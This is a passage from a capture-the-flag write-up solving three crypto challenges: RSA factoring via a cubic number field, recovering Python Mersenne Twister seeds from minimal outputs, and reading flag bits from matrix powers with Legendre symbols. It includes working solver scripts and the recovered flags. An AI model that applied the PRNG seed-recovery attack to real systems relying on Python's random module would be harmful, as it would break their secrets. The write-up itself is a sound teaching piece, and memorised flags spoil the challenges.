ct = 583923134770560329725969597854974954817875793223201855918544947864454662723867635785399659016709076642873878052382188776671557362982072671970362761186980877612369359390225243415378728776179883524295537607691571827283702387054497203051018081864728864347679606523298343320899830775463739426749812898275755128789910670953110189932506526059469355433776101712047677552367319451519452937737920833262802366767252338882535122186363375773646527797807010023406069837153015954208184298026280412545487298238972141277859462877659870292921806358086551087265080944696281740241711972141761164084554737925380675988550525333416462830465453346649622004827486255797343201397171878952840759670675361040051881542149839523371605515944524102331865520667005772313885253113470374005334182380501000

K.<a> = NumberField(x^3 - 16, "a")
O = K.order(a)
factors = O(r).factor()
for b, e in factors:
    f = (b**e).polynomial()
    if f.degree() > 1:
        continue
    p = f.constant_coefficient()
    q = f.leading_coefficient()
    assert p**3 + 16 * q**3 == r
    n = p * q * r
    phi = (p - 1) * (q - 1) * (r - 1)
    e = 65537
    d = inverse_mod(e, phi)
    m = pow(ct, d, n)
    print(long_to_bytes(m))
    # nite{7h3_Latt1c3_kn0ws_Ur_Pr1m3s_very_vvery_v3Ry_w3LLL}
```
## Import Random (crypto)
This challenge is based upon Stackered's research on recovering a [Mersenne Twister seed with a minimal number of samples](https://stackered.com/blog/python-random-prediction/).

`chall.py`
```python
from rAnDoM import *
import random
from Crypto.Util.number import *

flag = b"nite{REDACTED}"
chunks = [bytes_to_long(flag[i:i+4]) for i in range(0, len(flag), 4)]

yap = ""
for i in chunks:
    rAnDoM.sEeD(i)
    yap += hex(rAnDoM.gEtRanDBitS(32))
    yap += hex(rAnDoM.gEtRanDBitS(32))
    yap += hex(rAnDoM.gEtRanDBitS(32))
    yap += hex(rAnDoM.gEtRanDBitS(32))
    yap += hex(rAnDoM.gEtRanDBitS(32))
    yap += hex(rAnDoM.gEtRanDBitS(32))

print("WHAT IS BRO YAPPING ?!!")
print(f"\nbro :\n{yap}")
print("\nBRO WHAT ??!?!")
```
`random.py`
```python
import math
import random
from Crypto.Util.number import *

class rAnDoM:
    current_seed = 0
    indexes = [0,1,2,227,228,229]
    index = 0
    def __init__(cls) -> None:
        print('YESSIr')
        pass

    @classmethod
    def sEeD(cls, seed) -> None:
        if not isinstance(seed, (type(None), int, float, str, bytes, bytearray)):
            raise TypeError('The only supported seed types are: None,\n'
                            'int, float, str, bytes, and bytearray.')
        cls.current_seed = seed
        random.seed(seed)
    
    @classmethod
    def gEtRanDBitS(cls, bits : int) -> int:
        cls.sEeD(cls.current_seed)
        num = [random.getrandbits(32) for _ in range(624)][cls.indexes[cls.index % len(cls.indexes)]]
        cls.index += 1
        return int(bin(num**(bits // 32))[2:bits+2], 2)
```
The crux of the research is in mapping out the invertible dependencies within Python's Mersenne twister implementation. Let $K_j$ denote words of the seed key, $J_i$ denote words of the intermediate
key, $I_i$ denote the words of the initial seed state, and $S_i$ denote words of the successor PRNG state. Our goal is to recover the seed key $K_j$ given a small set of outputs from the PRNG. The main relations described by Stackered are as follows:

1. The PRNG outputs values of the form $T(S_i)$ where $T$ is an invertible tempering function. 
2. Given pairs of untempered successor states $S_i, S_{i - 227}$ we can recover the MSB of state $I_{i-1}$ and the 31-LSBs of state $I_{i}$.
3. Cascading the above fact twice, we can obtain the full values of three consecutive initial states $I_{i-2}, I_{i-1}, I_{i}$ up to 1 bit of error.
4. Given three consecutive initial states $I_{i-2}, I_{i-1}, I_{i}$, we can recover two consecutive words $J_{i-1}, J_{i}$ of the intermediate key.
5. Given two consecutive words $J_{i-1}, J_{i}$ of the intermediate key, we can recover a word $K_j$ of the seed key.

@@invert_image 
@@small_image
![ImportRandom](https://stackered.com/img/articles/python-random-prediction/diagram1.svg)
@@
@@

Since the challenge conveniently outputs the minimal number of PRNG words for
this recovery to occur, we can use the above strategy to repeatedly recover the
seed keys, which each form four bytes of the flag.

Below is an implementation in Python, using the [`python_random_playground`](https://github.com/StackeredSAS/python-random-playground/) library which accompanied the above research.
```python
#!/usr/bin/env python3

from python_random_playground.functions import *
import string


def solve():
    output = open("output.txt").read()
    out = [int(x, 16) for x in output.split("0x") if x]

    flag = b""
    for i in range(0, len(out), 6):
        chunk_out = out[i : i + 6]
        untempered = [untemper(s) for s in chunk_out]
        I_227_, I_228 = invertStep(untempered[0], untempered[3])
        I_228_, I_229 = invertStep(untempered[1], untempered[4])
        I_229_, I_230 = invertStep(untempered[2], untempered[5])

        I_228 += I_228_
        I_229 += I_229_

        seed1 = recover_Kj_from_Ii(I_230, I_229, I_228, 230)
        seed2 = recover_Kj_from_Ii(I_230 + 0x80000000, I_229, I_228, 230)

        flag1 = int.to_bytes(int(seed1), 4)
        flag2 = int.to_bytes(int(seed2), 4)

        if all(x in string.printable.encode() for x in flag1):
            flag += flag1
        else:
            flag += flag2
        print(flag)
        # nite{br0_y4pp1ng_s33d_sl1pp1ng}

```

## Quadrillion Matrices (crypto)
In this challenge we are given pairs of $2\times 2$ matrices satisfying 
\begin{equation*}
B_i = A_i^{b_i},
\end{equation*} 
where $b_i$ is odd if the $i$-th bit of the flag is set, and even otherwise.
```python
from Crypto.Util.number import *
from secret import gen_matrix
from sage.all import *
import random

p = getPrime(256)

with open('flag', 'rb') as f:
    flag = bin(bytes_to_long(f.read()))[2:]

inp = []
out = []

for i in flag:
    M = gen_matrix(p)
    inp.append(list(M))
    out.append( list((M**(random.randrange(3+int(i), p, 2))) * (M**(random.randrange(3, p, 2)))) )

with open('out', 'w') as f:
    f.write(str(p) + '\n')
    f.write(str(inp) + '\n')
    f.write(str(out))
```

The matrices $A_i$ are generated using a hidden process, but a quick
verification tells us that each $A_i$ is diagonalizable over
$\mathbb{F}_p$ and has at least one quadratic non-residue as an eigenvalue.
```python
assert all(inp.is_diagonalizable() for inp in tqdm(input_matrices))
assert all(
    any(not e.is_square() for e in inp.eigenvalues())
    for inp in tqdm(input_matrices)
)
```
Let $P_i$ be a matrix such that $P_i^{-1}D_iP_i = A_i$ with
\begin{equation*}
D = \begin{bmatrix}
\lambda_{i, 1} & 0 \\
0 & \lambda_{i, 2}
\end{bmatrix}.
\end{equation*} Then $B_i = A_i^{b_i} = P_i^{-1}D^{b_i}P$ with
\begin{equation*}
D^{b_i} = \begin{bmatrix}
\lambda_{i, 1}^{b_i} & 0 \\
0 & \lambda_{i, 2}^{b_i}
\end{bmatrix}.
\end{equation*} Without loss of generality, assume $\lambda_{i, 1}$ is a quadratic non-residue.
Then since the Legendre symbol is multiplicative, we have
\begin{equation*}
\left( \frac{\lambda_{i, 1}^{b_i}}{p} \right) = \left( \frac{\lambda_{i, 1}}{p}\right)^{b_i}
= \left( -1\right)^{b_i}. 
\end{equation*} Hence by calculating the Legendre symbol of the diagonal entries in $P_i^{-1}B_iP$, we
can determine the value of $\left( -1\right)^{b_i}$ and hence the parity of $b_i$.

The following is an implementation in Python.
```python
#!/usr/bin/env python3
from tqdm import tqdm
from Crypto.Util.number import *


def parse_input():
    with open("out") as fp:
        p = int(fp.readline())
        K = GF(p)
        inp = eval(fp.readline())
        out = eval(fp.readline())
        input_matrices = [matrix(K, i) for i in inp]
        output_matrices = [matrix(K, i) for i in out]

    return p, input_matrices, output_matrices


def solve():
    p, input_matrices, output_matrices = parse_input()

    assert all(inp.is_diagonalizable() for inp in tqdm(input_matrices))
    assert all(any(not e.is_square() for e in inp.eigenvalues()) for inp in tqdm(input_matrices))

    flag = ""
    for inp, out in tqdm(zip(input_matrices, output_matrices)):
        inpj, P = inp.diagonalization()  # P^T{-1}(inp)P = inpj
        outj = P.inverse() * out * P
        assert outj.is_diagonal()

        tests = zip(inpj.diagonal(), outj.diagonal())
        for x, y in tests:
            x_legendre = legendre_symbol(x, p)
            y_legendre = legendre_symbol(y, p)
            if x_legendre == -1:
                if y_legendre == 1:  # even = (-1)^even
                    flag += "0"
                elif y_legendre == -1:  # odd
                    flag += "1"
                break

    print(long_to_bytes(int(flag, 2)))
    # nite{0ur_b4tt1e_w4s_l0g3ndr3}
```

